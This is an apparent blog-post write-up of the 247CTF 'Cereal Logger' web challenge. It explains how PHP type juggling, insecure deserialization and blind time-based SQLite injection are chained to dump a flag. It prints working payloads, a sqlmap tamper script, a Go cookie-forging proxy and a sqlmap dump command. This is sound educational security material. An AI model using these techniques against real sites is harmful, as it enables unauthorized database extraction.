@@ -1,0 +1,213 @@
+<!DOCTYPE html>
+<html
+  class=""
+  lang="en-us"
+  prefix="og: http://ogp.me/ns# fb: http://ogp.me/ns/fb#"
+>
+  <head>
+    <meta charset="utf-8" />
+
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+<meta name="description" content="" />
+<meta name="HandheldFriendly" content="True" />
+<meta name="MobileOptimized" content="320" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+
+
+<meta name="keywords" content="">
+
+
+<meta property="og:type" content="article" />
+<meta property="og:description" content="" />
+<meta property="og:title" content="Cereal Logger" />
+<meta property="og:site_name" content="ramblings of an aspiring hacker" />
+<meta property="og:image" content="" />
+<meta property="og:image:type" content="image/jpeg" />
+<meta property="og:image:width" content="" />
+<meta property="og:image:height" content="" />
+<meta property="og:url" content="https://ejohn.github.io/posts/cereal-logger/" />
+<meta property="og:locale" content="en-us" />
+<meta property="article:published_time" content="2020-05-27
+" /> <meta property="article:modified_time" content="2020-05-27
+" />
+
+
+
+
+
+
+    <title>Cereal Logger</title>
+    <link rel="canonical" href="https://ejohn.github.io/posts/cereal-logger/" />
+
+
+    <link
+  rel="stylesheet"
+  href="https://unpkg.com/tachyons@4.11.1/css/tachyons.min.css"
+/>
+
+<link rel="stylesheet" href="https://ejohn.github.io/css/style.css" />
+
+<link
+  rel="stylesheet"
+  href="https://cdn.jsdelivr.net/npm/highlightjs@9.12.0/styles/monokai-sublime.css"
+/>
+
+
+
+    <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon" />
+    <link rel="apple-touch-icon" href="/apple-touch-icon.png" />
+  </head>
+
+
+<body
+  lang="en-us"
+  class="sans-serif w-90 w-60-ns center center-ns mv2 mv5-ns"
+  itemscope
+  itemtype="http://schema.org/Article"
+>
+  
+  <span class="b">/ </span>
+  <a
+    href="https://ejohn.github.io/"
+    class="b bb bw1 pb1 no-underline black"
+    >ramblings of an aspiring hacker</a
+  >
+
+  <section id="main" class="mt5">
+    <h1 itemprop="name" id="title">Cereal Logger</h1>
+
+    <article itemprop="articleBody" id="content" class="w-90 lh-copy">
+      <p>I recently came across <a href="https://twitter.com/247CTF/status/1262715256234631170">this</a> challenge on twitter.
+<img src="images/DDBF4151-82F6-49F6-9035-5B8BF4E3FABA%202.png" alt=""></p>
+<p>Write to <code>/dev/null</code> using a special cookie to read a flag! That intrigued me enough to sign up on 247ctf.com and take a crack at it myself.</p>
+<p>This is what the challenge looks like once you start playing.</p>
+<p><img src="images/u6_3XkEvUD0cR26HLRtGhFumdiCvnZ3wdM0HDOCmzbKZ5ANaQUV-XpgwYCUng2q_Sik6vqkEM1HGo4Y4vDS2CenZtZnN0Le0RqzqFyU1OC9wz9ujGLDW_51CcYRmTK-9FBH8CWbo%202.png" alt=""></p>
+<p>The code starts with an <code>insert_log</code> class which does some really questionable things but let’s come back to that later. The <code>if</code> statements are where the fun begins.</p>
+<p>It looks like we need to set a cookie with the name <code>247</code> for the server to do anything interesting.  Otherwise we just get the syntax highlighted code for the current page. From the looks of it, we are currently hitting this flow.</p>
+<p>Let’s try to take the more interesting path by satisfying the condition for the <code>if</code> statement.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">if (isset($_COOKIE[&#34;247&#34;]) <span style="color:#960050;background-color:#1e0010">&amp;&amp;</span> explode(&#34;.&#34;, $_COOKIE[&#34;247&#34;])[1].rand(0, 247247247) == &#34;0&#34;) {
+    ....
+}
+</code></pre></div><p>We need to set the <code>247</code> cookie with a value at satisfies a few conditions. <code>explode</code>  splits the cookie value into multiple parts based on the <code>.</code> separator. This check then uses the second part of it to concatenate with a random value between <code>0</code> and <code>247247247</code> to generate a random string. This random string is then compared with <code>”0”</code>.</p>
+<p>Let’s break this down. Suppose the value of the <code>247</code> cookie is <code>foo.bar</code>. The <code>explode</code>  extracts the second part <code>bar</code> after splitting on <code>.</code>. <code>bar</code> is then concatenated with a random value between  <code>0</code> and <code>247247247</code> . This value is then checked to see if it is <code>==</code> to <code>0</code>.</p>
+<p>At first glance this looks impossible! How can a <code>string + random number</code> be equal to <code>0</code>!
+<img src="images/C3EC44C3-C50C-42ED-B6EA-8288C08480FB%202.png" alt=""></p>
+<p>I don’t have a PHP dev environment handy but let’s use one of them online IDE’s! I am new to PHP but not new to weirdness involving equality operators! Let’s investigate if that is the case. My google-fu quickly got me to <a href="https://stackoverflow.com/questions/3333353/string-comparison-using-vs-strcmp">this</a> stack overflow answer.</p>
+<p><img src="images/F65272D6-B287-4734-A88A-B0A9CA8DA2E6%202.png" alt=""></p>
+<p>Boom! This is exactly what we want! Let’s test out this theory.</p>
+<p><img src="images/980C352C-71AC-4C1F-9B9B-C111E77DCB16%202.png" alt=""></p>
+<p>Let me unpack what’s going on here.  According to the stack overflow answer, php tries to convert strings that start with an exponent notation to a float when the <code>==</code> operator is used.  Since we want the conversion to result in a <code>0</code> we start the string with <code>0e</code>. What follows <code>0e</code> does not matter since <code>0</code> multiplied by any other number is still <code>0</code>. See <a href="https://www.nyu.edu/pages/mathmol/textbook/scinot.html">this</a> for more information on scientific exponent notation.</p>
+<p>So now we have a way to satisfy the first check. Let’s test it out against the challenge site</p>
+<p><img src="images/3BAD5CF8-2184-46D5-8B7F-E9ABA90B04B8%202.png" alt=""></p>
+<p>Looks like it worked! Notice the <code>Content-Length</code> is <code>0</code>.  We do not expect any response from the server since the server just tries to write something to <code>/dev/null</code> and returns nothing. You can confirm this by calling the endpoint without a cookie and see that it responds with a lot more content.</p>
+<p><img src="images/6D7A4C30-5A29-41A8-9768-7C5BD4317B78%202.png" alt=""></p>
+<p>Ok, so now we have successfully bypassed the first stage of this challenge! Let’s see what is going on in the next line.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">file_put_contents(&#34;/dev/null&#34;, unserialize(base64_decode(explode(&#34;.&#34;, $_COOKIE[&#34;247&#34;])[0])));
+</code></pre></div><p>The server <code>explode</code>s the cookie value on <code>.</code> and uses the first chunk to base 64 decode and then deserialize into an object. All alarm bells should be going off in your head right now! User supplied data is passed directly into an <code>unserialize</code> call!  Deserializing untrusted data is a recipe for disaster, take a look <a href="https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection">here</a> for more information.</p>
+<p>So, how can we exploit this? We need a vulnerable class in order to exploit this. Class you say? where did we see one before? Time for a deeper look at the  <code>insert_log</code> class!</p>
+<p>This class looks like it is used to log access to the page but it does that in a very weird way. The class has one string field <code>new_data</code> and a destructor function <code>__destruct</code>.  The <a href="https://www.php.net/manual/en/language.oop5.decon.php">destructor method</a> will be called as soon as there are no other references to a particular object, or in any order during the shutdown sequence.</p>
+<p>Let’s take a closer look at the destructor function.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">public function __destruct()
+{
+	$this-&gt;pdo = new SQLite3(“/tmp/log.db”);
+	$this-&gt;pdo-&gt;exec(“INSERT INTO log (message) VALUES (‘”.$this-&gt;new_data.”’);”);
+}
+</code></pre></div><p>This <code>__destruct</code> function is called when there are no more references left to a particular instance of <code>insert_log</code> class. At first glance, it is obvious that this function is vulnerable to SQL injection if we can control the <code>new_data</code>  field. But <code>new_data</code> is always assigned a value of <code>valid access logged</code>! Is there a way around that? If only there was a way to create a new instance of <code>insert_log</code> with an arbitrary <code>new_data</code> value. And that is exactly what the insecure <code>unserialize</code>  call gives us.</p>
+<p>Let’s figure out a way to generate a serialized payload to feed into this <code>unserialize</code> call. We can use php to do the heavy lifting for us and generate the payload.</p>
+<p><img src="images/AF8A67D5-6D07-44B7-A678-79C6E5F9C65C.png" alt=""></p>
+<p>In this example, we redefine the <code>insert_log</code> class with an arbitrary <code>new_data</code> value and then serialize it
+followed by base64 encoding it.</p>
+<p>Next we need to come up with a SQL injection payload that will work in this situation.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">$this-&gt;pdo-&gt;exec(&#34;INSERT INTO log (message) VALUES (&#39;&#34;.$this-&gt;new_data.&#34;&#39;);&#34;);
+</code></pre></div><p>We need to close out the insert statement, start a new arbitrary sql statement and then comment out the rest of the statement. From the source code we have a valuable clue that the database we are targeting is sqlite. Another thing to note is that we get no response from server so we have no way of knowing if our injection worked or not other than timing information! If we can inject a SQL statement that is guaranteed to run for a long duration before the query completes, the server will wait that long before sending us a blank response.</p>
+<p>Some googling for a time based SQL injection payload that works on sqlite brought me to this <a href="https://github.com/unicornsasfuel/sqlite_sqli_cheat_sheet">page</a>.</p>
+<p>We can use the following payload to validate our theory and check if there is a delay before the server responds to our request. The <code>randomblob</code> functions generate a random blob of arbitrary number of bytes. The more number of bytes the function needs to generates, the more it takes to finish. We can use this side effect to test whether our queries are working as expected.</p>
+<pre><code>select 1 = randomblob(999999999)
+</code></pre><p>To construct the full payload we need to close the insert and also comment out the trailing characters.</p>
+<pre><code>fakeinsert'); select 1 = randomblob(999999999);--
+</code></pre><p>Let’s create the full cookie with this payload.
+<img src="images/9A1743C4-366A-4058-A298-71DB159B5A3E.png" alt=""></p>
+<p>Test it against the challenge server.
+<img src="images/16930BB0-94D6-414E-B725-A5D753302DD6.png" alt=""></p>
+<p>This request took close to 2 seconds to complete and errors out with a 502. Let’s verify if the timing information is reliable by requesting only 1 random byte this time using the following payload. This should take less time than the previous request.</p>
+<pre><code>fakeinsert'); select 1 = randomblob(1);--
+</code></pre><p>Regenerate the cookie with this payload and check the time the request takes.
+<img src="images/99A2CE83-7D66-43EA-B986-829AF296C959.png" alt=""></p>
+<p>This request indeed takes less time than the previous request, coming in at less than a second. Repeat this a few times to confirm the timing difference is reliable.</p>
+<p>At this stage we have everything we need to exploit the SQL injection and extract information. The only caveat is that, since this is a blind time based attack, we can only extract one character at a time. See <a href="https://owasp.org/www-community/attacks/Blind_SQL_Injection">here</a> for more information on blind SQL injections why we can only extract one character at a time. Doing this by hand is extremely time consuming so we need to automate it. There are many tools like <a href="http://sqlmap.org/">sqlmap</a> designed specifically to do this. However the payloads that sqlmap generates will need to undergo some transformation before it can be used to attack the server.</p>
+<p>This shows the transformations needed in order to pull this off.</p>
+<pre><code>sqlmap payload -&gt; php serialize -&gt; base64 encode -&gt; construct cookie -&gt; http request
+</code></pre><p>sqlmap has an option called <code>-—tamper</code> to specificy a python script to transform the payload before being sent to the server.</p>
+<p>An example of a tamper script we need might look like this. Look at the other tamper scripts supplied with sqlmap for a better idea.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">tamper</span>(payload, <span style="color:#f92672">**</span>kwargs):
+    retVal <span style="color:#f92672">=</span> payload
+    <span style="color:#66d9ef">if</span> payload:
+       p1 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;O:10:</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">insert_log</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">:1:{s:8:</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">new_data</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">;s:</span><span style="color:#e6db74">%d</span><span style="color:#e6db74">:</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">;}&#39;</span> <span style="color:#f92672">%</span> (len(payload),payload)
+       p2 <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>b64encode(p1)
+       retVal <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">.0e&#39;</span> <span style="color:#f92672">%</span> p2
+
+    <span style="color:#66d9ef">return</span> retVal
+</code></pre></div><p>However I was having a lot of trouble getting it to work reliably for this challenge. Let’s try a different way.</p>
+<p>We can create an HTTP proxy server that listens on localhost and accepts requests with a specific query parameter that sqlmap can test against. Once the server receives this request with a query value, it transforms the payload and forwards the request to the challenge site. The proxy will then forward the response from the challenge site back to sqlmap. Simple enough!</p>
+<p>Go is my go to language for something like this. I have uploaded the full code for the proxy <a href="https://gist.github.com/ejohn/4d2169b7087515cf07ab6c00075e147c">here</a>, but here are the highlights.</p>
+<pre><code>// errors ignored for sake of brevity, see full code
+func main() {
+	mux := http.NewServeMux()
+	mux.HandleFunc(&quot;/&quot;, func(w http.ResponseWriter, r *http.Request) {
+		payload := r.URL.Query().Get(&quot;sql&quot;)
+		resp, _ := challenge(payload)
+		body, _ := ioutil.ReadAll(resp.Body)
+		w.Write(body)
+	})
+	log.Fatal(http.ListenAndServe(&quot;127.0.0.1:9001&quot;, mux))
+}
+
+func challenge(payload string) (*http.Response, error) {
+	req, _ := http.NewRequest(&quot;GET&quot;, &quot;https://challenge.247ctf.com/&quot;, nil)
+	cookie := get247cookie(payload)
+	req.AddCookie(cookie)
+
+	return http.DefaultClient.Do(req)
+}
+
+func get247cookie(payload string) *http.Cookie {
+	b64serialized := base64.StdEncoding.EncodeToString([]byte(serialize(payload)))
+	cookie := http.Cookie{
+		Name:  &quot;247&quot;,
+		Value: fmt.Sprintf(&quot;%s.0e&quot;, b64serialized),
+	}
+	return &amp;cookie
+}
+
+func serialize(payload string) string {
+	template := &quot;O:10:\&quot;insert_log\&quot;:1:{s:8:\&quot;new_data\&quot;;s:%d:\&quot;%s\&quot;;}&quot;
+	return fmt.Sprintf(template, len(payload), payload)
+}
+</code></pre><p>All that is left is to point sqlmap at our local server and let it do its job. After some experimentation, this is the sqlmap invocation that worked for me.
+<code>./sqlmap.py -u 'http://127.0.0.1:9001?sql=test' -p &quot;sql&quot; --dbms sqlite --technique=T --dump --level 5 --risk 3 --no-cast  --random-agent</code></p>
+<p><img src="images/D0208EFB-653B-4F03-A46A-292A72343F12.png" alt=""></p>
+<p>As you can see in the screenshot, sqlmap identified an injection payload that worked reliably to extract data. It found two tables, flag and log in the database. A bit further down in the output, sqlmap spits this out!
+<img src="images/37624E44-61BE-44FF-8002-02451F74F688.png" alt=""></p>
+<p>And there you have it! That was a fun challenge that chained a lot of different vulnerabilities, <a href="https://www.sjoerdlangkemper.nl/2018/07/04/type-confusion-in-monstra-cms/">type confusion</a>, insecure deserialization and blind sql injection!</p>
+
+    </article>
+  </section>
+
+  <footer>
+    <div>
+      <p class="f6 gray mt6 lh-copy">
+        
+      </p>
+    </div>
+  </footer>
+  
+  <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.14.2/highlight.min.js"></script>
+
+<script>
+  hljs.initHighlightingOnLoad();
+</script>
+
+
+
+  </body>
+</html>
